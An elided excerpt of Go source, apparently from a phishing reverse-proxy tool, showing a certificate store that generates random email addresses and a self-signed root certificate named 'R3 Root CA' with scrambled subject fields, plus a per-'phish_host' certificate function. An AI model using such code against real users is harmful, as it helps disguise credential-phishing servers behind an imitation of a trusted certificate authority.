...
import (
	...
	"github.com/rickm2618/tippietoe/log"
...
func (o *CertDb) GetEmail() string {
	...
	if err != nil {
		email = strings.ToLower(GenRandomString(7) + "@" + GenRandomString(12) + ".com")
...
func (o *CertDb) generateCertificates() error {
	...
	if err != nil {
		...
		template := x509.Certificate{
			...
			Subject: pkix.Name{
				Country:            []string{"US"},
				Locality:           []string{"New York","IOWA","ATLANTA","WASHINGTON","DES MOINE","MONTANA","CALIFORNIA"},
				Organization:       []string{"Lite","Aggregator","Organizational Unit"},
				OrganizationalUnit: []string{"SO","PT","TE","TC","XW"},
				CommonName:         "R3 Root CA",
			},
			NotBefore:             notBefore,
			NotAfter:              notAfter,
...
func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
	...
	if phish_host == "" {
		...
		template = x509.Certificate{
			...
			Subject:               pkix.Name{Organization: []string{"Lite Server Inc."}},
			NotBefore:             time.Now(),
